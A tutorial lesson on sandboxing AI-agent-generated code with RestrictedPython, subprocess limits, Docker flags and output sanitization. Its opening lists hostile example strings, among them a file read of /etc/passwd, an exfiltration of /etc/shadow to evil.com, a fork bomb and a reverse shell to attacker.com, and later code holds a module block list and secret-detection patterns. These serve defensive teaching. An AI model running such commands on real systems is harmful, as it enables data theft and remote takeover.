---
title: "Sandboxed code execution"
---

# Sandboxed code execution

## Introduction

Code execution is the most dangerous capability an agent can have. When an agent writes and runs code — whether to analyze data, transform files, or test implementations — it operates with the full power of the host runtime. A single `import os; os.system("rm -rf /")` in generated code can destroy the system. Sandboxed code execution constrains what generated code can do, creating an isolated environment where code runs with limited access to the file system, network, and system APIs.

We explore four approaches, from lightweight Python-level sandboxes to full container isolation, each trading off security strength against complexity and performance.

### What we'll cover

- Why `exec()` and `eval()` are dangerous without sandboxing
- RestrictedPython for safe Python subset execution
- Process-level sandboxing with `subprocess` and resource limits
- Container-based code execution with Docker
- Output sanitization to prevent data leakage through results

### Prerequisites

- Python process management (`subprocess` module)
- Resource limits (Lesson 02)
- Basic Docker concepts
- Understanding of Python compilation and execution

---

## Why vanilla `exec()` is dangerous

Python's `exec()` and `eval()` execute arbitrary code with full access to the runtime. An agent that uses these functions to run LLM-generated code has zero isolation.

```python
# ⚠️ NEVER DO THIS IN PRODUCTION
# These are examples of what an attacker can do through exec()

dangerous_code_examples = [
    # Read sensitive files
    'open("/etc/passwd").read()',

    # Delete files
    'import os; os.remove("/important/data.db")',

    # Exfiltrate data
    'import urllib.request; urllib.request.urlopen("https://evil.com/steal?" + open("/etc/shadow").read())',

    # Fork bomb (crash the system)
    'import os\nwhile True: os.fork()',

    # Reverse shell
    'import socket,subprocess; s=socket.socket(); s.connect(("attacker.com",4444)); subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())',
]

print("=== Dangerous Code Patterns (DO NOT EXECUTE) ===\n")
for i, code in enumerate(dangerous_code_examples, 1):
    first_line = code.split('\n')[0][:60]
    print(f"  {i}. {first_line}...")
print("\nAll of these would succeed in a bare exec() call!")
```

**Output:**
```
=== Dangerous Code Patterns (DO NOT EXECUTE) ===

  1. open("/etc/passwd").read()...
  2. import os; os.remove("/important/data.db")...
  3. import urllib.request; urllib.request.urlopen("https://evil...
  4. import os...
  5. import socket,subprocess; s=socket.socket(); s.connect(("a...

All of these would succeed in a bare exec() call!
```

> **Warning:** Even restricting `__builtins__` in `exec()` is insufficient. Attackers can escape through `__subclasses__()`, `__import__()`, and other Python internals. Never rely on `exec()` with restricted globals as a security mechanism.

---

## RestrictedPython: a safe Python subset

RestrictedPython compiles Python source code into a restricted form by transforming the AST (Abstract Syntax Tree). It replaces dangerous operations with guarded versions that you control.

### How RestrictedPython works

```mermaid
flowchart LR
    A[Python Source Code] --> B[RestrictedPython Compiler]
    B --> C[Modified AST]
    C --> D[Byte Code]
    D --> E[Execute with<br/>Restricted Builtins]

    B -->|Transforms| F[Attribute access → _getattr_]
    B -->|Transforms| G[Item access → _getitem_]
    B -->|Transforms| H[Iteration → _getiter_]
    B -->|Transforms| I[Print → _print_]

    style B fill:#f96,stroke:#333
    style E fill:#6f9,stroke:#333
```

RestrictedPython works by:

1. **Compiling** source to an AST (like Python's standard `compile()`)
2. **Transforming** the AST to replace dangerous operations with guarded versions
3. **Executing** the modified bytecode with restricted `__builtins__`

### Basic RestrictedPython usage

```python
from RestrictedPython import compile_restricted, safe_globals
from RestrictedPython.Eval import default_guarded_getattr
from RestrictedPython.Guards import (
    guarded_unpack_sequence,
    safe_builtins,
)


def run_restricted(code: str, extra_globals: dict = None) -> dict:
    """Execute Python code in a restricted environment.

    Returns the local namespace after execution (variables created).
    """
    # Compile with restrictions
    try:
        byte_code = compile_restricted(
            code,
            filename="<agent-code>",
            mode="exec",
        )
    except SyntaxError as e:
        return {"_error": f"Compilation error: {e}"}

    # Set up restricted globals
    restricted_globals = {
        "__builtins__": safe_builtins,
        "_getattr_": default_guarded_getattr,
        "_getiter_": iter,  # Allow iteration
        "_getitem_": lambda obj, key: obj[key],  # Allow indexing
        "_unpack_sequence_": guarded_unpack_sequence,
        "_print_": lambda *args, **kwargs: None,  # Capture print
    }

    if extra_globals:
        restricted_globals.update(extra_globals)

    # Execute in restricted environment
    restricted_locals = {}
    try:
        exec(byte_code, restricted_globals, restricted_locals)
    except Exception as e:
        restricted_locals["_error"] = f"Runtime error: {type(e).__name__}: {e}"

    return restricted_locals


# Safe code: math operations
result = run_restricted("""
numbers = [1, 2, 3, 4, 5]
total = sum(numbers)
average = total / len(numbers)
squared = [x ** 2 for x in numbers]
""")
print(f"Safe code result: total={result.get('total')}, "
      f"average={result.get('average')}, squared={result.get('squared')}")

# Dangerous code: try to import os
result = run_restricted("""
import os
os.system('whoami')
""")
print(f"Import attempt: {result.get('_error', 'No error?!')}")

# Dangerous code: try to access __builtins__
result = run_restricted("""
x = __builtins__['__import__']('os')
""")
print(f"Builtins escape: {result.get('_error', 'No error?!')}")
```

**Output:**
```
Safe code result: total=15, average=3.0, squared=[1, 4, 9, 16, 25]
Import attempt: Runtime error: ImportError: __import__ not found
Builtins escape: Runtime error: KeyError: '__import__'
```

### Providing safe APIs to restricted code

We can expose specific functions to agent-generated code while keeping everything else locked down:

```python
from RestrictedPython import compile_restricted
from RestrictedPython.Guards import safe_builtins
from RestrictedPython.Eval import default_guarded_getattr


def create_safe_math_environment() -> dict:
    """Create an environment that only allows math operations."""
    import math

    # Allowlist specific math functions
    safe_math = {
        "sqrt": math.sqrt,
        "sin": math.sin,
        "cos": math.cos,
        "pi": math.pi,
        "e": math.e,
        "log": math.log,
        "ceil": math.ceil,
        "floor": math.floor,
        "abs": abs,
        "round": round,
        "min": min,
        "max": max,
    }

    return {
        "__builtins__": safe_builtins,
        "_getattr_": default_guarded_getattr,
        "_getiter_": iter,
        "_getitem_": lambda obj, key: obj[key],
        "math": type("SafeMath", (), safe_math)(),  # Create a namespace object
    }


def run_math_code(code: str) -> dict:
    """Run code with only math capabilities."""
    env = create_safe_math_environment()
    local_ns = {}

    try:
        byte_code = compile_restricted(code, "<math-code>", "exec")
        exec(byte_code, env, local_ns)
    except Exception as e:
        local_ns["_error"] = f"{type(e).__name__}: {e}"

    return local_ns


# Agent-generated math code
result = run_math_code("""
# Calculate the hypotenuse of a right triangle
a = 3
b = 4
c = math.sqrt(a**2 + b**2)

# Area of a circle with radius 5
radius = 5
area = math.pi * radius**2
circumference = 2 * math.pi * radius
""")

print(f"Hypotenuse: {result.get('c')}")
print(f"Circle area: {result.get('area'):.2f}")
print(f"Circumference: {result.get('circumference'):.2f}")

# Try to escape
result = run_math_code("""
# Attempt to access the file system through math
import os
""")
print(f"Escape attempt: {result.get('_error')}")
```

**Output:**
```
Hypotenuse: 5.0
Circle area: 78.54
Circumference: 31.42
Escape attempt: ImportError: __import__ not found
```

> **🤖 AI Context:** RestrictedPython is version 8.x as of 2025. It provides `safe_builtins`, `limited_builtins`, and `utilities_builtins` with increasing levels of access. For agent code execution, start with `safe_builtins` and add only the specific functions your agent needs.

---

## Process-level sandboxing with `subprocess`

For stronger isolation than RestrictedPython provides, we run agent-generated code in a separate process with resource limits. The child process can't affect the parent even if it's compromised.

### Sandboxed subprocess execution

```python
import json
import os
import resource
import subprocess
import sys
import tempfile
from dataclasses import dataclass


@dataclass
class SandboxConfig:
    """Configuration for the code sandbox."""
    timeout_seconds: int = 10
    max_memory_mb: int = 100
    max_cpu_seconds: int = 5
    max_file_size_mb: int = 1
    max_processes: int = 1
    allowed_modules: list[str] | None = None  # None = allow all stdlib


class ProcessSandbox:
    """Execute code in a sandboxed subprocess."""

    # Modules that should never be importable
    BLOCKED_MODULES = {
        "os", "sys", "subprocess", "shutil", "socket", "http",
        "urllib", "requests", "ctypes", "importlib", "code",
        "codeop", "compileall", "multiprocessing", "threading",
        "signal", "resource", "pathlib",
    }

    def __init__(self, config: SandboxConfig | None = None):
        self.config = config or SandboxConfig()

    def execute(self, code: str) -> dict:
        """Execute code in a sandboxed subprocess.

        Returns dict with 'stdout', 'stderr', 'returncode', and 'result'.
        """
        # Wrap code in a safety harness
        wrapped = self._wrap_code(code)

        # Write to temp file
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".py", delete=False
        ) as f:
            f.write(wrapped)
            script_path = f.name

        try:
            result = subprocess.run(
                [sys.executable, script_path],
                capture_output=True,
                text=True,
                timeout=self.config.timeout_seconds,
                env=self._restricted_env(),
                # Don't inherit parent's file descriptors
                close_fds=True,
            )

            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
                "success": result.returncode == 0,
            }

        except subprocess.TimeoutExpired:
            return {
                "stdout": "",
                "stderr": f"Execution timed out ({self.config.timeout_seconds}s)",
                "returncode": -1,
                "success": False,
            }
        finally:
            os.unlink(script_path)

    def _wrap_code(self, code: str) -> str:
        """Wrap user code with resource limits and module blocking."""
        blocked = ", ".join(f'"{m}"' for m in self.BLOCKED_MODULES)

        return f"""
import resource
import sys

# Set resource limits
resource.setrlimit(resource.RLIMIT_CPU, ({self.config.max_cpu_seconds}, {self.config.max_cpu_seconds + 2}))
resource.setrlimit(resource.RLIMIT_AS, ({self.config.max_memory_mb * 1024 * 1024}, {self.config.max_memory_mb * 1024 * 1024}))
resource.setrlimit(resource.RLIMIT_FSIZE, ({self.config.max_file_size_mb * 1024 * 1024}, {self.config.max_file_size_mb * 1024 * 1024}))
resource.setrlimit(resource.RLIMIT_NPROC, ({self.config.max_processes}, {self.config.max_processes}))

# Block dangerous modules
BLOCKED = [{blocked}]
original_import = __builtins__.__import__

def restricted_import(name, *args, **kwargs):
    if name.split('.')[0] in BLOCKED:
        raise ImportError(f"Module '{{name}}' is blocked in sandbox")
    return original_import(name, *args, **kwargs)

__builtins__.__import__ = restricted_import

# Execute user code
try:
{self._indent(code, 4)}
except Exception as e:
    print(f"Error: {{type(e).__name__}}: {{e}}", file=sys.stderr)
    sys.exit(1)
"""

    def _restricted_env(self) -> dict:
        """Create a restricted environment for the subprocess."""
        env = {
            "PATH": "/usr/bin:/bin",
            "HOME": "/tmp",
            "LANG": "C.UTF-8",
        }
        # Don't pass through API keys or secrets
        return env

    def _indent(self, code: str, spaces: int) -> str:
        """Indent code block."""
        prefix = " " * spaces
        return "\n".join(prefix + line for line in code.split("\n"))


# Demo
sandbox = ProcessSandbox(SandboxConfig(
    timeout_seconds=5,
    max_memory_mb=50,
    max_cpu_seconds=3,
))

# Safe code
print("=== Safe Code ===")
result = sandbox.execute("""
data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
mean = sum(data) / len(data)
variance = sum((x - mean) ** 2 for x in data) / len(data)
std_dev = variance ** 0.5
print(f"Mean: {mean}")
print(f"Std Dev: {std_dev:.4f}")
""")
print(f"Output: {result['stdout']}")
print(f"Success: {result['success']}")

# Dangerous code: try to import os
print("\n=== Blocked Import ===")
result = sandbox.execute("""
import os
print(os.listdir('/'))
""")
print(f"Output: {result['stdout']}")
print(f"Error: {result['stderr']}")
print(f"Success: {result['success']}")

# Dangerous code: try to use network
print("\n=== Blocked Network ===")
result = sandbox.execute("""
import socket
s = socket.socket()
s.connect(('evil.com', 80))
""")
print(f"Error: {result['stderr']}")
print(f"Success: {result['success']}")
```

**Output:**
```
=== Safe Code ===
Output: Mean: 5.5
Std Dev: 2.8723

Success: True

=== Blocked Import ===
Output: 
Error: Error: ImportError: Module 'os' is blocked in sandbox
Success: False

=== Blocked Network ===
Error: Error: ImportError: Module 'socket' is blocked in sandbox
Success: False
```

---

## Container-based code execution

For the strongest isolation, we run agent-generated code inside Docker containers. This provides kernel-level separation through namespaces and cgroups.

### Docker sandbox executor

```python
import json
import subprocess
import tempfile
import os
from dataclasses import dataclass


@dataclass
class ContainerSandboxConfig:
    """Configuration for containerized code execution."""
    image: str = "python:3.12-slim"
    memory_limit: str = "128m"
    cpu_limit: float = 0.5       # Half a CPU core
    timeout_seconds: int = 30
    network_disabled: bool = True
    read_only_rootfs: bool = True
    no_new_privileges: bool = True
    tmpfs_size: str = "64m"       # Writable /tmp in memory


class DockerSandbox:
    """Execute code in isolated Docker containers."""

    def execute(self, code: str, config: ContainerSandboxConfig = None) -> dict:
        """Run code in a fresh Docker container."""
        config = config or ContainerSandboxConfig()

        # Write code to a temp file
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".py", delete=False, dir="/tmp"
        ) as f:
            f.write(code)
            script_path = f.name

        try:
            cmd = self._build_docker_command(script_path, config)
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=config.timeout_seconds + 5,  # Extra buffer
            )

            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
                "success": result.returncode == 0,
            }

        except subprocess.TimeoutExpired:
            return {
                "stdout": "",
                "stderr": "Container timed out",
                "returncode": -1,
                "success": False,
            }
        finally:
            os.unlink(script_path)

    def _build_docker_command(
        self, script_path: str, config: ContainerSandboxConfig
    ) -> list[str]:
        """Build the docker run command with all security flags."""
        cmd = [
            "docker", "run",
            "--rm",                              # Remove container after exit
            f"--memory={config.memory_limit}",   # Memory limit
            f"--cpus={config.cpu_limit}",         # CPU limit
            "--pids-limit=50",                   # Limit processes
            f"--stop-timeout={config.timeout_seconds}",
        ]

        if config.network_disabled:
            cmd.append("--network=none")         # No network access

        if config.read_only_rootfs:
            cmd.append("--read-only")            # Read-only filesystem
            # Add writable tmpfs for Python to work
            cmd.append(f"--tmpfs=/tmp:size={config.tmpfs_size}")

        if config.no_new_privileges:
            cmd.append("--security-opt=no-new-privileges")

        # Drop all capabilities, add back only what's needed
        cmd.extend([
            "--cap-drop=ALL",
            "--user=nobody",                     # Run as non-root
        ])

        # Mount the script as read-only
        cmd.extend([
            "-v", f"{script_path}:/sandbox/script.py:ro",
            config.image,
            "python", "/sandbox/script.py",
        ])

        return cmd


# Example usage (requires Docker installed)
sandbox = DockerSandbox()
config = ContainerSandboxConfig(
    memory_limit="64m",
    cpu_limit=0.25,
    timeout_seconds=10,
    network_disabled=True,
    read_only_rootfs=True,
)

# Show the docker command that would be generated
print("=== Docker Sandbox Command ===\n")
with tempfile.NamedTemporaryFile(suffix=".py", delete=False) as f:
    f.write(b"print('hello')")
    cmd = sandbox._build_docker_command(f.name, config)
    os.unlink(f.name)

print("docker run \\")
for arg in cmd[2:]:
    print(f"  {arg} \\")

print("\n=== Security Flags Explained ===")
flags = {
    "--rm": "Container is deleted after execution",
    "--memory=64m": "Hard memory limit of 64MB",
    "--cpus=0.25": "Maximum 25% of one CPU core",
    "--network=none": "No network access at all",
    "--read-only": "Root filesystem is read-only",
    "--cap-drop=ALL": "Drop ALL Linux capabilities",
    "--user=nobody": "Run as non-root user",
    "--pids-limit=50": "Max 50 processes (prevents fork bombs)",
    "--security-opt=no-new-privileges": "Can't gain new privileges via setuid/setgid",
}
for flag, desc in flags.items():
    print(f"  {flag:<40} {desc}")
```

**Output:**
```
=== Docker Sandbox Command ===

docker run \
  --rm \
  --memory=64m \
  --cpus=0.25 \
  --pids-limit=50 \
  --stop-timeout=10 \
  --network=none \
  --read-only \
  --tmpfs=/tmp:size=64m \
  --security-opt=no-new-privileges \
  --cap-drop=ALL \
  --user=nobody \
  -v /tmp/tmpXXXXXX.py:/sandbox/script.py:ro \
  python:3.12-slim \
  python /sandbox/script.py \

=== Security Flags Explained ===
  --rm                                     Container is deleted after execution
  --memory=64m                             Hard memory limit of 64MB
  --cpus=0.25                              Maximum 25% of one CPU core
  --network=none                           No network access at all
  --read-only                              Root filesystem is read-only
  --cap-drop=ALL                           Drop ALL Linux capabilities
  --user=nobody                            Run as non-root user
  --pids-limit=50                          Max 50 processes (prevents fork bombs)
  --security-opt=no-new-privileges         Can't gain new privileges via setuid/setgid
```

---

## Output sanitization

Even after sandboxed execution, the output might contain sensitive information. We sanitize outputs before returning them to the agent or user.

```python
import re
from dataclasses import dataclass


@dataclass
class SanitizationRule:
    """A rule for detecting and redacting sensitive data."""
    name: str
    pattern: str
    replacement: str


class OutputSanitizer:
    """Sanitize code execution output before returning to the agent."""

    DEFAULT_RULES = [
        SanitizationRule(
            "API Keys (OpenAI)",
            r"sk-[a-zA-Z0-9]{20,}",
            "[REDACTED_API_KEY]",
        ),
        SanitizationRule(
            "AWS Access Keys",
            r"AKIA[A-Z0-9]{16}",
            "[REDACTED_AWS_KEY]",
        ),
        SanitizationRule(
            "Private Keys",
            r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----[\s\S]*?-----END (?:RSA |EC )?PRIVATE KEY-----",
            "[REDACTED_PRIVATE_KEY]",
        ),
        SanitizationRule(
            "Email Addresses",
            r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
            "[REDACTED_EMAIL]",
        ),
        SanitizationRule(
            "IP Addresses (Private)",
            r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b",
            "[REDACTED_INTERNAL_IP]",
        ),
        SanitizationRule(
            "File Paths (System)",
            r"/(etc|root|home/[a-z]+)/[^\s]+",
            "[REDACTED_SYSTEM_PATH]",
        ),
        SanitizationRule(
            "Connection Strings",
            r"(postgres|mysql|mongodb|redis)://[^\s]+",
            "[REDACTED_CONNECTION_STRING]",
        ),
    ]

    def __init__(self, extra_rules: list[SanitizationRule] | None = None):
        self.rules = self.DEFAULT_RULES.copy()
        if extra_rules:
            self.rules.extend(extra_rules)

    def sanitize(self, output: str) -> tuple[str, list[str]]:
        """Sanitize output, returning cleaned text and list of detections."""
        detections = []
        cleaned = output

        for rule in self.rules:
            matches = re.findall(rule.pattern, cleaned)
            if matches:
                detections.append(
                    f"{rule.name}: {len(matches) if isinstance(matches[0], str) else len(matches)} occurrence(s)"
                )
                cleaned = re.sub(rule.pattern, rule.replacement, cleaned)

        return cleaned, detections

    def check_output_size(self, output: str, max_chars: int = 10_000) -> str:
        """Truncate excessively large outputs."""
        if len(output) > max_chars:
            return (
                output[:max_chars]
                + f"\n\n[OUTPUT TRUNCATED: {len(output):,} chars, "
                f"showing first {max_chars:,}]"
            )
        return output


# Demo
sanitizer = OutputSanitizer()

test_output = """
Database connection successful!
Connected to: postgres://admin:secretpassword@10.0.1.5:5432/production
Server IP: 192.168.1.100
Config loaded from /etc/myapp/config.yaml
Email sent to admin@company.com
Using API key: sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz1234567890abcdef

Query results:
  - Users: 1,523
  - Active sessions: 89
"""

cleaned, detections = sanitizer.sanitize(test_output)

print("=== Original Output ===")
print(test_output)

print("=== Sanitized Output ===")
print(cleaned)

print("=== Detections ===")
for d in detections:
    print(f"  ⚠️ {d}")
```

**Output:**
```
=== Original Output ===

Database connection successful!
Connected to: postgres://admin:secretpassword@10.0.1.5:5432/production
Server IP: 192.168.1.100
Config loaded from /etc/myapp/config.yaml
Email sent to admin@company.com
Using API key: sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz1234567890abcdef

Query results:
  - Users: 1,523
  - Active sessions: 89

=== Sanitized Output ===

Database connection successful!
Connected to: [REDACTED_CONNECTION_STRING]
Server IP: [REDACTED_INTERNAL_IP]
Config loaded from [REDACTED_SYSTEM_PATH]
Email sent to [REDACTED_EMAIL]
Using API key: [REDACTED_API_KEY]

Query results:
  - Users: 1,523
  - Active sessions: 89

=== Detections ===
  ⚠️ API Keys (OpenAI): 1 occurrence(s)
  ⚠️ Email Addresses: 1 occurrence(s)
  ⚠️ IP Addresses (Private): 2 occurrence(s)
  ⚠️ File Paths (System): 1 occurrence(s)
  ⚠️ Connection Strings: 1 occurrence(s)
```

---

## Choosing the right sandbox level

| Approach | Security | Performance | Complexity | Best For |
|----------|----------|-------------|------------|----------|
| RestrictedPython | Medium | Fast (~ms) | Low | Math, data transforms, simple scripts |
| subprocess + resource limits | High | Medium (~100ms) | Medium | General Python code with OS-level isolation |
| Docker container | Very High | Slow (~1-5s) | High | Untrusted code, multi-language support |
| gVisor / Kata Containers | Highest | Slow (~2-10s) | Very High | Zero-trust environments, compliance requirements |

```mermaid
flowchart TD
    A{What code<br/>will run?} -->|Simple math/data| B[RestrictedPython]
    A -->|General Python| C{Trust level?}
    A -->|Multi-language| D[Docker Container]
    C -->|Semi-trusted| E[subprocess + limits]
    C -->|Untrusted| D

    style B fill:#dfd,stroke:#333
    style E fill:#ffd,stroke:#333
    style D fill:#fdd,stroke:#333
```

---

## Best practices

| Practice | Why It Matters |
|----------|----------------|
| Always sanitize output | Code might print secrets even in a sandbox |
| Set both time and memory limits | Either resource can be exhausted independently |
| Use `--network=none` for Docker sandboxes | Prevents data exfiltration entirely |
| Drop all capabilities and run as nobody | Minimal system access even if sandbox is escaped |
| Delete containers after execution | Prevents data persistence between runs |
| Log all sandbox executions with code hash | Audit trail for what code was run and when |

---

## Common pitfalls

| ❌ Mistake | ✅ Solution |
|-----------|-------------|
| Using `exec()` with restricted globals as "sandboxing" | Use RestrictedPython, subprocess isolation, or containers |
| Letting sandboxed code write to the host filesystem | Use `--read-only` with `--tmpfs` for temporary writes |
| Not setting `--pids-limit` in Docker | Fork bombs can still crash the host without this flag |
| Trusting RestrictedPython for fully untrusted code | It's a defense layer, not a complete sandbox — combine with process isolation |
| Returning raw output without sanitization | Always strip secrets, paths, and internal info before returning |
| Reusing containers between executions | Use `--rm` to ensure clean state for every run |

---

## Hands-on exercise

### Your task

Build a `CodeSandbox` class that supports multiple execution backends (RestrictedPython and subprocess) with automatic output sanitization.

### Requirements

1. Accept code as a string and a `backend` parameter ("restricted" or "subprocess")
2. For "restricted" backend, use `compile_restricted` with `safe_builtins`
3. For "subprocess" backend, write code to a temp file and run with resource limits
4. Sanitize all output to remove API keys, file paths, and email addresses
5. Return a `SandboxResult` dataclass with `stdout`, `stderr`, `success`, `sanitized`, and `detections`

### Expected result

Both backends should safely execute math code and block attempts to access the filesystem or network.

<details>
<summary>💡 Hints (click to expand)</summary>

- Use the `OutputSanitizer` class from this lesson for sanitization
- For subprocess, use `subprocess.run(..., timeout=5, env={})` for isolation
- The RestrictedPython backend catches compilation errors at the `compile_restricted` step
- Always wrap execution in try/except to handle unexpected errors gracefully

</details>

<details>
<summary>✅ Solution (click to expand)</summary>

```python
import os
import re
import subprocess
import sys
import tempfile
from dataclasses import dataclass, field


@dataclass
class SandboxResult:
    stdout: str = ""
    stderr: str = ""
    success: bool = False
    sanitized: str = ""
    detections: list[str] = field(default_factory=list)
    backend: str = ""


class CodeSandbox:
    SECRET_PATTERNS = [
        (r"sk-[a-zA-Z0-9]{20,}", "[REDACTED_KEY]"),
        (r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "[REDACTED_EMAIL]"),
        (r"/(etc|root|home/\w+)/\S+", "[REDACTED_PATH]"),
    ]

    def execute(self, code: str, backend: str = "restricted") -> SandboxResult:
        if backend == "restricted":
            result = self._run_restricted(code)
        elif backend == "subprocess":
            result = self._run_subprocess(code)
        else:
            return SandboxResult(stderr=f"Unknown backend: {backend}")

        result.sanitized, result.detections = self._sanitize(result.stdout)
        result.backend = backend
        return result

    def _run_restricted(self, code: str) -> SandboxResult:
        from RestrictedPython import compile_restricted
        from RestrictedPython.Guards import safe_builtins

        try:
            byte_code = compile_restricted(code, "<sandbox>", "exec")
        except SyntaxError as e:
            return SandboxResult(stderr=f"Syntax error: {e}")

        captured = []
        def _print(*args, **kwargs):
            captured.append(" ".join(str(a) for a in args))

        env = {
            "__builtins__": {**safe_builtins, "print": _print},
            "_getiter_": iter,
            "_getitem_": lambda obj, key: obj[key],
        }

        try:
            exec(byte_code, env)
            return SandboxResult(stdout="\n".join(captured), success=True)
        except Exception as e:
            return SandboxResult(stderr=f"{type(e).__name__}: {e}")

    def _run_subprocess(self, code: str) -> SandboxResult:
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(code)
            path = f.name

        try:
            result = subprocess.run(
                [sys.executable, path],
                capture_output=True, text=True,
                timeout=5,
                env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"},
            )
            return SandboxResult(
                stdout=result.stdout,
                stderr=result.stderr,
                success=result.returncode == 0,
            )
        except subprocess.TimeoutExpired:
            return SandboxResult(stderr="Timeout exceeded")
        finally:
            os.unlink(path)

    def _sanitize(self, text: str) -> tuple[str, list[str]]:
        detections = []
        for pattern, replacement in self.SECRET_PATTERNS:
            if re.search(pattern, text):
                detections.append(f"Found: {pattern}")
                text = re.sub(pattern, replacement, text)
        return text, detections


# Test both backends
sandbox = CodeSandbox()
code = "print(sum([1,2,3,4,5]))"

for backend in ["restricted", "subprocess"]:
    result = sandbox.execute(code, backend)
    print(f"{backend}: {result.stdout.strip()} (success={result.success})")
```
</details>

### Bonus challenges

- [ ] Add a "docker" backend that uses the `DockerSandbox` class
- [ ] Implement a code complexity analyzer that rejects code with too many loops or function calls
- [ ] Create a session-based sandbox that persists state between executions (with memory limits)

---

## Summary

✅ **Vanilla `exec()` provides zero isolation** — attackers can access files, network, and system APIs through numerous escape paths

✅ **RestrictedPython** compiles code into a safe subset by transforming the AST and restricting builtins — fast but not bulletproof against determined attackers

✅ **subprocess sandboxing** adds OS-level isolation through resource limits, environment stripping, and module blocking — good for semi-trusted code

✅ **Docker containers** provide the strongest isolation with kernel-level namespaces, cgroups, capability dropping, and network disabling — essential for untrusted code

✅ **Output sanitization** is always necessary — even sandboxed code might print secrets, internal IPs, or system paths in its output

---

**Next:** [Network Isolation](./04-network-isolation.md)

**Previous:** [Resource Limits](./02-resource-limits.md)

---

## Further Reading

- [RestrictedPython Documentation](https://restrictedpython.readthedocs.io/en/latest/) - Safe Python subset execution
- [Docker Security Best Practices](https://docs.docker.com/engine/security/) - Container security fundamentals
- [Python subprocess Module](https://docs.python.org/3/library/subprocess.html) - Process creation and management
- [gVisor](https://gvisor.dev/) - Application kernel for container sandboxing

<!-- 
Sources Consulted:
- RestrictedPython idea: https://restrictedpython.readthedocs.io/en/latest/idea.html
- Docker Engine Security: https://docs.docker.com/engine/security/
- Docker Resource Constraints: https://docs.docker.com/engine/containers/resource_constraints/
- Python subprocess: https://docs.python.org/3/library/subprocess.html
- Python resource module: https://docs.python.org/3/library/resource.html
-->
